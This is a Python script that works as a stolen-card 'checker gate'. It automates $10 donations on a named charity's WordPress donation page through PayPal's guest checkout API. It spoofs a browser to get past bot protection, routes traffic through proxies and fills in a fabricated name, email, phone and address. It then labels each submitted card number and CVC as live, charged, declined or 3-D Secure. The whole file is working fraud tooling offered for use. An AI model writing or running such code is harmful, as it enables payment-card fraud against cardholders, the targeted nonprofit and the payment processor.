import cloudscraper
import requests
import json
import re
import random
import string
import asyncio

def _generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    return f"{name}@{random.choice(domains)}"

def _detect_card_brand(cc):
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def check_card_paypal_lounsbury_sync(cc, mm, yy, cvc, proxy_url=None):
    """
    Synchronous PayPal Commerce $10.00 Gate (lounsburyhouse.org) extracted from gay.py.
    Flow:
    1. GET /donate/ (extract nonce & client token)
    2. POST wp-admin/admin-ajax.php (action=wpforms_paypal_commerce_create_subscription)
    3. POST https://www.paypal.com/smart/api/billagmt/subscriptions/{id}/cartid
    4. POST https://www.paypal.com/graphql?OnboardGuestMutation
    Returns: (status, message, brand)
    """
    if len(yy) == 2:
        yy = f"20{yy}"

    s = cloudscraper.create_scraper()
    useragents = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    s.headers.update({'User-Agent': useragents})

    if proxy_url:
        s.proxies = {'http': proxy_url, 'https': proxy_url}

    try:
        # Step 1: GET page for nonces
        r_page = s.get('https://lounsburyhouse.org/donate/', timeout=15)
        html = r_page.text

        nonce_match = re.search(r'"create_subscription":"([^"]+)"', html)
        if not nonce_match:
            return "error", "Failed to extract PayPal subscription nonce", "N/A"
        nonce_sub = nonce_match.group(1)

        email = _generate_email()
        first_name = "Martin"
        last_name = "Mark"
        brand = _detect_card_brand(cc)

        # Step 2: Create subscription
        params_sub = {'action': 'wpforms_paypal_commerce_create_subscription'}
        headers_wp = {
            'Origin': 'https://lounsburyhouse.org',
            'Referer': 'https://lounsburyhouse.org/donate/',
        }
        payload_sub = {
            'wpforms[fields][4]': (None, ''),
            'wpforms[fields][6]': (None, ''),
            'wpforms[fields][1][first]': (None, first_name),
            'wpforms[fields][1][last]': (None, last_name),
            'wpforms[fields][3]': (None, email),
            'wpforms[fields][2]': (None, '10.00'),
            'wpforms[fields][5]': (None, ''),
            'wpforms[fields][11][orderID]': (None, ''),
            'wpforms[fields][11][subscriptionID]': (None, ''),
            'wpforms[fields][11][source]': (None, ''),
            'wpforms[fields][11][cardname]': (None, ''),
            'wpforms[recaptcha]': (None, ''),
            'wpforms[id]': (None, '464'),
            'page_title': (None, 'DONATE'),
            'page_url': (None, 'https://lounsburyhouse.org/donate/'),
            'url_referer': (None, ''),
            'page_id': (None, '332'),
            'wpforms[post_id]': (None, '332'),
            'total': (None, '10'),
            'planId': (None, ''),
            'nonce': (None, nonce_sub),
        }

        r_sub = s.post('https://lounsburyhouse.org/wp-admin/admin-ajax.php', params=params_sub, headers=headers_wp, files=payload_sub, timeout=15)
        try:
            sub_json = r_sub.json()
            id_token_cart = sub_json.get('data', {}).get('id')
        except Exception:
            id_token_cart = None

        if not id_token_cart:
            match_id = re.search(r'"id":"([^"]+)"', r_sub.text)
            if match_id:
                id_token_cart = match_id.group(1)
            else:
                return "declined", f"Subscription Init Failed ({r_sub.status_code})", brand

        # Step 3: Get Cart Token from PayPal
        headers_pp = {
            'Accept': 'application/json',
            'X-Requested-By': 'smart-payment-buttons',
            'Origin': 'https://www.paypal.com',
        }
        r_cart = s.post(f'https://www.paypal.com/smart/api/billagmt/subscriptions/{id_token_cart}/cartid', headers=headers_pp, timeout=15)
        try:
            cart_json = r_cart.json()
            token_checkout = cart_json.get('token')
        except Exception:
            token_checkout = None

        if not token_checkout:
            match_tok = re.search(r'"token":"([^"]+)"', r_cart.text)
            token_checkout = match_tok.group(1) if match_tok else id_token_cart

        # Step 4: Onboard Guest & Pay via PayPal GraphQL
        headers_gql = {
            'Content-Type': 'application/json',
            'Paypal-Client-Context': token_checkout,
            'X-App-Name': 'checkoutuinodeweb_weasley',
            'Origin': 'https://www.paypal.com',
            'X-Country': 'US',
        }

        graphql_payload = {
            'operationName': 'OnboardGuestMutation',
            'variables': {
                'card': {
                    'cardNumber': cc,
                    'expirationDate': f"{mm}/{yy}",
                    'securityCode': cvc,
                    'type': brand,
                },
                'country': 'US',
                'email': email,
                'firstName': first_name,
                'lastName': last_name,
                'phone': {'countryCode': '1', 'number': '5159662869', 'type': 'MOBILE'},
                'supportedThreeDsExperiences': ['IFRAME'],
                'token': token_checkout,
                'billingAddress': {
                    'line1': '8872 SE Vandalia Dr',
                    'city': 'Runnells',
                    'state': 'IA',
                    'postalCode': '50237',
                    'country': 'US',
                    'familyName': last_name,
                    'givenName': first_name,
                },
                'shippingAddress': {
                    'line1': '',
                    'city': '',
                    'state': '',
                    'postalCode': '',
                    'accountQuality': {
                        'autoCompleteType': 'MANUAL',
                        'isUserModified': False,
                    },
                    'country': 'US',
                    'familyName': first_name,
                    'givenName': last_name,
                },
                'crsData': None,
            },
            'query': 'mutation OnboardGuestMutation($bank: BankAccountInput, $billingAddress: AddressInput, $card: CardInput, $country: CountryCodes, $currencyConversionType: CheckoutCurrencyConversionType, $dateOfBirth: DateOfBirth, $email: String, $firstName: String!, $lastName: String!, $phone: PhoneInput, $shareAddressWithDonatee: Boolean, $shippingAddress: AddressInput, $supportedThreeDsExperiences: [ThreeDSPaymentExperience], $token: String!) {\n  onboardAccount: onboardGuest(\n    bank: $bank\n    billingAddress: $billingAddress\n    card: $card\n    country: $country\n    currencyConversionType: $currencyConversionType\n    dateOfBirth: $dateOfBirth\n    email: $email\n    firstName: $firstName\n    lastName: $lastName\n    phone: $phone\n    shareAddressWithDonatee: $shareAddressWithDonatee\n    shippingAddress: $shippingAddress\n    token: $token\n  ) {\n    buyer {\n      auth {\n        accessToken\n        __typename\n      }\n      userId\n      __typename\n    }\n    flags {\n      is3DSecureRequired\n      __typename\n    }\n    ...fundingOptions\n    paymentContingencies {\n      threeDomainSecure(experiences: $supportedThreeDsExperiences) {\n        status\n        redirectUrl {\n          href\n          __typename\n        }\n        method\n        parameter\n        experience\n        requestParams {\n          key\n          value\n          __typename\n        }\n        __typename\n      }\n      ...threeDSContingencyData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment fundingOptions on CheckoutSession {\n  fundingOptions {\n    allPlans {\n      fundingSources {\n        fundingInstrument {\n          id\n          __typename\n        }\n        amount {\n          currencyCode\n          currencyValue\n          __typename\n        }\n        __typename\n      }\n      fundingContingencies {\n        ... on OpenBankingContingency {\n          encryptedId\n          contingencyReasons\n          contingencyType\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    fundingInstrument {\n      id\n      lastDigits\n      name\n      nameDescription\n      type\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment threeDSContingencyData on PaymentContingencies {\n  threeDSContingencyData {\n    name\n    causeName\n    resolution {\n      type\n      resolutionName\n      paymentCard {\n        billingAddress {\n          line1\n          line2\n          city\n          state\n          country\n          postalCode\n          __typename\n        }\n        expireYear\n        expireMonth\n        currencyCode\n        cardProductClass\n        id\n        encryptedNumber\n        type\n        number\n        bankIdentificationNumber\n        __typename\n      }\n      contingencyContext {\n        deviceDataCollectionUrl {\n          href\n          __typename\n        }\n        jwtSpecification {\n          jwtDuration\n          jwtIssuer\n          jwtOrgUnitId\n          type\n          __typename\n        }\n        authenticationProvider\n        cardBrandProcessed\n        reason\n        referenceId\n        source\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n'
        }

        r_gql = s.post('https://www.paypal.com/graphql?OnboardGuestMutation', headers=headers_gql, json=graphql_payload, timeout=20)

        res_text = r_gql.text

        if "ISSUER_DECLINE" in res_text or "CARD_GENERIC_ERROR" in res_text:
            return "declined", "Card Declined (Issuer Decline)", brand
        elif "INVALID_SECURITY_CODE" in res_text:
            return "live", "CVV Mismatch", brand
        elif "GUEST_CARD_COUNTRY_MISMATCH" in res_text:
            return "live", "Card Approved (Country Mismatch)", brand
        elif "is3DSecureRequired" in res_text and "true" in res_text.lower():
            return "3ds", "3D Secure / Verification Required", brand
        elif "onboardAccount" in res_text or "accessToken" in res_text:
            return "charged", "Charge Successful ($10.00)", brand
        else:
            msg = re.search(r'"message":"([^"]+)"', res_text)
            err_txt = msg.group(1) if msg else res_text[:80]
            return "declined", f"Declined - {err_txt}", brand

    except Exception as e:
        return "error", str(e), "N/A"

async def check_card_paypal_lounsbury(cc, mm, yy, cvc, proxy_url=None):
    """
    Async wrapper for check_card_paypal_lounsbury_sync.
    """
    return await asyncio.to_thread(check_card_paypal_lounsbury_sync, cc, mm, yy, cvc, proxy_url=proxy_url)
